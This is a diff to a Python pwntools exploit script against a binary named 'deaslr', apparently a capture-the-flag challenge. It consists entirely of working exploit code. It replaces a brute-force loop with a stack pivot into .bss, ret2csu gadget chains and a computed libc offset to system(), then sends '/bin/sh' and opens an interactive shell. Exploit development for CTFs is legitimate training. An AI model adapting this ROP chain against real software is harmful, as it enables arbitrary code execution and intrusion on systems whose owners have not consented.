@@ -7,6 +7,7 @@
 
 from pwn import *
 import sys
+import time
 
 def conn():
 	local = 0
@@ -26,10 +27,12 @@ def conn():
 			debug = 1
 
 	if local:
-		s = process('./deaslr')
+		s = process('./deaslr_patched')
 		if debug:
 			gdb.attach(s, gdbscript='''
-				b*0x0000000000400554
+				b*0x400554
+				b*0x4005ba
+				b*system
 				c
 			''')
 		else:
@@ -39,6 +42,8 @@ def conn():
 
 	return s
 
+s = conn()
+
 elf = ELF('deaslr')
 libc = ELF('libc_64.so.6')
 
@@ -46,25 +51,30 @@ pop_rdi = 0x4005c3
 bss = 0x601000
 pop_6 = 0x4005ba
 ret = 0x4003f9
-offset = 0xfffffffffffd6610
+leave_ret = 0x400554
+call_ret2csu = 0x4005A0
+add_rbp_0x48 = 0x4004f8
+offset = libc.symbols['system'] - (libc.symbols['__GI__IO_getline_info'] + 292)
 
-payload = b'A' * 0x18 + p64(pop_rdi) + p64(bss) + p64(elf.symbols['gets'])
-payload += p64(pop_6) + p64(elf.got['gets'] - 0x10) + p64(0) * 4 + p64(bss)
-payload += p64(pop_rdi) + p64(bss + 8) + p64(ret) * 6 + b'\xb0'
+payload = b'A' * 0x10 + p64(bss + 0x200)
+payload += p64(pop_rdi) + p64(bss + 0x200)
+payload += p64(elf.symbols['gets']) + p64(leave_ret)
 
-while True:
-	try:
-		s = conn()
+s.sendline(payload)
 
-		s.sendline(payload)
-		s.sendline(p64(offset) + b'/bin/sh')
+payload = b'A' * 8 + p64(pop_rdi) + p64(bss + 0x500)
+payload += p64(elf.symbols['gets']) + p64(pop_6)
+payload += p64(0) + p64(1) + p64(bss + 0x258)
+payload += p64(offset, sign='signed') + p64(0) * 2
+payload += p64(ret) + p64(call_ret2csu) + p64(0) * 2
+payload += p64(bss + 0x158) + p64(0) * 4
+payload += p64(add_rbp_0x48) + p64(0)
+payload += p64(pop_6) + p64(0) * 2 + p64(bss + 0x1a0)
+payload += p64(0) * 2 + p64(bss + 0x500)
+payload += p64(call_ret2csu)
 
-		s.clean()
-		s.sendline(b'ls')
-		s.recv(timeout = 1)
+s.sendline(payload)
 
-		break
-	except:
-		s.close()
+s.sendline(b'/bin/sh')
 
 s.interactive()
